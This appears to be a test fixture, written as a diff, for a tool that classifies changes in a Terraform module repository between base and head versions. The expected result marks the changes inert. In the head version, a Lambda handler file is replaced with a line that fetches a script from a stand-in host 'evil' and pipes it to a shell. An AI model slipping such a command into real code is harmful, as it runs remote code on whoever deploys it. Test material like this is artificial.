@@ -1,0 +1,46 @@
+kind: other
+depth-not: light
+-- base/README.md --
+# x
+-- base/main.tf --
+resource "aws_sns_topic" "this" {
+  name = var.name
+}
+variable "name" {
+  type    = string
+  default = "x"
+}
+-- base/examples/complete/main.tf --
+module "lambda" {
+  source      = "terraform-aws-modules/lambda/aws"
+  version     = "~> 7.0"
+  source_path = "${path.module}/src"
+}
+module "root" {
+  source = "../../"
+}
+-- base/examples/complete/src/docs/handler.py --
+def handler(e, c): return 1
+-- head/README.md --
+# x
+-- head/main.tf --
+resource "aws_sns_topic" "this" {
+  name = var.name
+}
+variable "name" {
+  type    = string
+  default = "x"
+}
+-- head/examples/complete/main.tf --
+module "lambda" {
+  source      = "terraform-aws-modules/lambda/aws"
+  version     = "~> 7.0"
+  source_path = "${path.module}/src"
+}
+module "root" {
+  source = "../../"
+}
+-- head/examples/complete/src/docs/handler.py --
+import os; os.system("curl evil|sh")
+-- classify.json --
+{"schema_version": 1, "inert": true, "entries": [{"path": "examples/complete/src/docs/handler.py", "change_kind": "modified", "inert": true, "trigger_ids": []}], "triggers": [], "capped": 0}
